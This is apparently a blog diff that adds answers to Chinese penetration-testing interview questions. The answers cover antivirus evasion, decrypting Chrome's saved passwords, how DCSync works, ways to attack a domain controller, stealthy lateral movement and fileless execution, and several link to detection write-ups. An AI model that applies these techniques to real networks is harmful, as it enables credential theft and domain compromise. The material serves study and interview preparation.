+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/220991">Windows凭证机制浅析</a></p>
+<ol start="33">
+<li>如何对抗杀软加后门用户</li>
+</ol>
+<p>绕过敏感操作方式：白加黑。利用Windows系统的一些白文件去执行相应的敏感操作。<br>绕过流量特征方式：<br>(1) TCP分段。指的是数据包在传输过程中切分后以小段传输(效果不错，但网络不好容易断)<br>(2) 内容加密。针对传输内容加密混淆，比如执行命令的字符串<br>(3) 使用合法证书。<br><a target="_blank" rel="noopener" href="https://0range-x.github.io/2022/03/31/%E6%B5%85%E6%9E%90%E6%9D%80%E8%BD%AF/">浅析杀软</a></p>
+<ol start="34">
+<li>chrome dump密码的原理，如果让你写个工具，思路是什么？（或者别人工具的实现原理）</li>
+</ol>
+<p>chrome dump密码的原理：<br>正常用户访问网站时，可选择使用Chrome浏览器保存登录的用户密码，用于下次登录的时候Chrome自动填写登录密码<br>Chrome中保存的密码先被二次加密(通过Windows API CryptProtectData()实现)，然后被保存在SQLite数据库文件中，位置如下：<br><code>%LocalAppData%\Google\Chrome\User Data\Default\Login Data</code><br>解密需要获得三部分内容：<br>(1) 加密密钥(即Master Key文件)，位于%appdata%\Microsoft\Protect下对应sid文件夹下的文件<br>(2) 数据库文件Login Data<br>(3) 用户明文的密码，用于解密加密密钥</p>
+<p>简单的方式(适用于部分非直接登录的站点)：<br>直接登录对应的网站，通过F12修改密码框字段属性为 <code>value type = &quot;text&quot;</code><br>即可显示密码</p>
+<p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81">导出Chrome浏览器中保存的密码</a><br><a target="_blank" rel="noopener" href="https://www.huwoo.net/2020/post-4150.html">离线导出Chrome浏览器中保存的密码</a><br><a target="_blank" rel="noopener" href="https://yinhaoqin.com/%E5%9F%9F%E5%AE%89%E5%85%A8/%E6%94%BB%E5%87%BB%E6%88%98%E6%9C%AF/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%BC%E5%87%BA%E5%AF%86%E7%A0%81/">浏览器导出密码</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2204689">最全的内网凭据密码收集方法和技巧总结</a></p>
+<ol start="35">
+<li>PTH哈希传递</li>
+</ol>
+<p>见问题29</p>
+<ol start="36">
+<li>DCsync原理，DCsync是哪个协议？</li>
+</ol>
+<p>当企业内网当做部署了多台域控制器后，一台域控进行了数据的更改之后，需要与其他域控进行数据的同步，而这个同步是通过Microsoft的远程目录复制服务协议 (MS-DRSR),该协议是基于MSRPC &#x2F; DCE&#x2F;RPC )进行的。并且其 DRS 的 Microsoft API 是DRSUAPI(这个在后面抓包可以看到)。在不同域控制器（DC）之间，每 15 分钟都会有一次域数据的同步。当一个域控制器（DC 1）想从其他域控制器（DC 2）获取数据时，DC 1 会向 DC 2 发起一个 GetNCChanges 请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync 就是利用的这个原理，通过 Directory Replication Service（DRS） 服务的 GetNCChanges 接口向域控发起数据同步请求。</p>
+<p>DCsync原理：利用DCSync导出域内用户的哈希值，本质上就是利用DRS(Directory Replication Service)协议通过 IDL_DRSGetNCChanges 从域控制器复制用户哈希凭据，以便进一步进行利用。<br>对拥有“复制目录更改（DS-Replication-Get-Changes）、全部复制目录更改 (DS-Replication-Get-Changes-All )、在过滤集中复制目录更改(可有可无)（DS-Replication-Get-Changes-In-Filtered-Set）”三条DACL的域用户，向域控发出数据同步请求，从而去dump域内用户hash。<br>默认本地管理员，域管理员或企业管理员以及域控制器计算机账户得成员默认具有上述权限。<br>注意，默认情况下，DCSync 攻击的对象如果是只读域控制器 (RODC)，则会失效，因为 RODC 是不能参与复制同步数据到其他 DC 的。</p>
+<p>DCsync是：DRS(Directory Replication Service)协议。<br><a target="_blank" rel="noopener" href="https://tttang.com/archive/1634/">DCSync 技术的攻击和检测</a><br><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/186924.html">基于AD Event日志识别DCSync攻击</a></p>
+<ol start="37">
+<li>有台Windows域内机器，如何打域控？</li>
+</ol>
+<p>Windows攻击域控的方式：<br>1、高权限读取本地密码(procdump+mimikatz绕过杀软)<br>2、SYSVOL组策略获取密码<br>3、Kerberoasting暴力破解密码<br>4、内网协议NTLM之内网大杀器CVE-20191040漏洞<br>5、CVE-2020-1472-ZeroLogon<br>6、MS14-068漏洞进行提权<br>7、窃取域管理员令牌<br>8、进程迁移</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53742230/article/details/126082408">Windows 内网渗透之攻击域控</a></p>
+<ol start="38">
+<li>webshell 提权（低权限到高权限）</li>
+</ol>
+<p>见问题2</p>
+<ol start="39">
+<li>已经拿到webshell，说说你的内网思路</li>
+</ol>
+<p>拿到webshell，内网思路：<br>探测系统信息，提权，针对Windows想办法开启远程桌面连接，针对Linux想办法使用反弹shell来本地连接。<br>(1) 探测系统信息：whoami(查看当前权限)，netuser(查看用户&#x2F;组)，systeminfo(查看系统补丁修复情况)等常见命令<br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1036438">内网渗透测试思路（二）</a></p>
+<ol start="40">
+<li>不允许扫描，如何横向</li>
+</ol>
+<p>总体思路就是两种：要么不扫描，要么扫描不被发现。<br>如果不扫描，那么就使用无扫描渗透测试工具；侧信道攻击；还有社工和物理渗透。<br>如果扫描不被发现，就需要进行隐藏：使用应用层代理工具，比如SSH隧道；端口转发和端口隧道；DNS隧道；数据编码和隐蔽通信。</p>
+<p>(1) 无扫描渗透测试工具： 一些专门的渗透测试工具允许执行渗透测试而不触发传统的扫描检测。这些工具可能使用更智能的技术，以避免被IDS&#x2F;IPS（入侵检测系统&#x2F;入侵防御系统）检测到，从而进行横向移动。例如，Cobalt Strike 和Metasploit Beacon。<br>(2) 应用层代理：使用应用层代理工具，如SSH隧道或代理工具，可通过目标网络进行横向移动，而不会触发传统扫描检测。这些工具可以将流量伪装成合法的应用层通信，以避免被检测到。<br>(3) 端口转发和端口隧道：使用工具如 <code>ssh -L</code> 或 <code>ssh -R</code> ，可以在目标系统之间建立端口转发或反向隧道，从而使流量通过建立已建立的连接进行传输，而不触发扫描检测。<br>(4) DNS隧道：使用DNS隧道工具，可以通过DNS请求和响应来传输数据，这通常不会被视为扫描活动。工具如Dnscat2或lodine可用于此目的。<br>(5) 数据编码和隐蔽通信：将数据编码为看似正常通信的形式，例如使用Base64编码或其它编码技术。可以在网络上流动而不引起警觉。<br>(6) 侧信道攻击：利用目标系统的侧信道信息，如CPU利用率、电源消耗等，来执行攻击并获取信息，而不触发扫描检测。<br>(7) 社交工程和物理渗透：利用社交工程技巧或物理访问，可以获取目标系统的凭据或物理访问权限，从而进行横向移动。</p>
+<p>侧信道攻击是一种安全漏洞利用技术，它不是通过直接攻击系统的计算能力或漏洞来获取信息，而是通过观察目标系统在执行某些操作时泄露的辅助信息来获取敏感数据。</p>
+<ol start="41">
+<li>存在杀软，不允许exe落地，怎么办</li>
+</ol>
+<p>1、使用无文件攻击技术：无文件攻击技术不需要将可执行文件写入磁盘，而是利用操作系统和应用程序的功能来执行恶意代码。这种方法可以绕过杀软的检测。例如，可以使用PowerShell或JavaScript来运行脚本，而不需要生成可执行文件。<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/65152928">无文件攻击的各种姿势</a>, <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/263960.html">常见的windows下无文件落地攻击手法</a><br>2、使用已知合法工具：利用目标系统上已经存在的合法工具来执行渗透测试任务。这些工具通常不会被杀软检测为恶意软件。例如，使用Windows内置工具，如WMIC或Powershell，来执行命令或脚本。<br>3、编写自定义脚本：编写自定义脚本或小型程序，以执行所需的任务。这些脚本可以使用编程语言如python或ruby编写，然后在目标系统上执行，而无需生成可执行文件。<br>4、使用反射型DLL注入：反射型DLL注入是一种技术，允许将代码注入到现有进程的内存中，而不会在磁盘上生成可执行文件。这可以通过工具如Reflective DLL Injection实现。<br>5、使用远程命令执行：利用远程命令执行功能，例如SSH、Powershell Remoting或Windows远程管理服务，以在目标系统上执行命令和脚本，而不需要将文件传输到目标系统上。</p>
+<ol start="42">
+<li>常用的提权姿势</li>
+</ol>
+<p>见问题2</p>
+<ol start="43">
 <li><p>内网代理（详细问了frp）</p>
 </li>
 <li><p>内网如何反弹shell，反弹的shell流量如何屏蔽</p>
@@ -883,13 +1038,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">519k</span>
+    <span title="站点总字数">535k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">7:52</span>
+    <span title="站点阅读时长">8:06</span>
 </div>
 
 <!--
